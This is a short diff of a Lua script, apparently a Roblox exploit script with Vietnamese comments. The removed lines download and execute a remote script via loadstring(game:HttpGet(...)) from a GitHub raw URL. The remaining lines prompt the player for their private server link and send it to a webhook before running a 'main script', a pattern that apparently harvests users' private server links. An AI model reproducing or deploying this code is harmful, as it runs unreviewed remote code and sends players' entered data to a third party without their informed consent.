@@ -302,13 +302,10 @@ local function sendWebhook(link)
     end
 end
 
--- Tải sẵn script chính vào biến để dùng lại
-local moreira = loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/moreira/refs/heads/main/moreira"))
-
 if serverType == "PUBLIC SERVER" then
 	sendWebhook()
 	pcall(function()
-		moreira() -- chạy script chính
+		a() -- chạy script chính
 	end)
 else
 	local playerGui = player and player:WaitForChild("PlayerGui")
@@ -404,7 +401,7 @@ else
 				screenGui:Destroy()
 				task.spawn(function()
 					pcall(function() sendWebhook(txt) end)
-					pcall(function() moreira() end) -- chạy script chính sau khi gửi webhook
+					pcall(function() a() end) -- chạy script chính sau khi gửi webhook
 				end)
 			else
 				showError("Please enter your private server link")
